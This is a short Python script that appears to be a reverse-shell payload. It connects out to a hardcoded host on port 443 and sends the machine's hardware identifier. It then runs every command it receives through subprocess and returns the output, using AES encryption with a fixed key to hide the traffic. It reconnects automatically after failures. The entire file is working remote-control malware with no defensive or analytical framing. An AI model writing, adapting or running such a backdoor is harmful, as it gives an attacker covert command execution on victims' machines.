import threading
import subprocess as sp
import socket
import uuid
import base64
import time
from Crypto.Cipher import AES


counter = b"H"*16
key = b"H"*32

def encrypt(message):
    encrypto = AES.new(key, AES.MODE_CTR, counter=lambda: counter)
    return encrypto.encrypt(message)

def decrypt(message):
    decrypto = AES.new(key, AES.MODE_CTR, counter=lambda: counter)
    return  decrypto.decrypt(message) 
 

def payload():
    HOST = '192.168.1.53'    # The remote host
    PORT = 443               # The same port as used by the server
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect((HOST, PORT))
            a=hex(uuid.getnode())
            a = bytes(a, 'utf-8')
            a=base64.b64encode(a)
            s.sendall(encrypt(a))
            while True:
                msg=s.recv(2048).decode('utf-8')
                output = sp.getoutput(decrypt(msg))
                msg = bytes(output + " ", 'utf-8')
                s.sendall(encrypt(msg))
    except socket.error as error:
        time.sleep(10)
        payload()
payload()
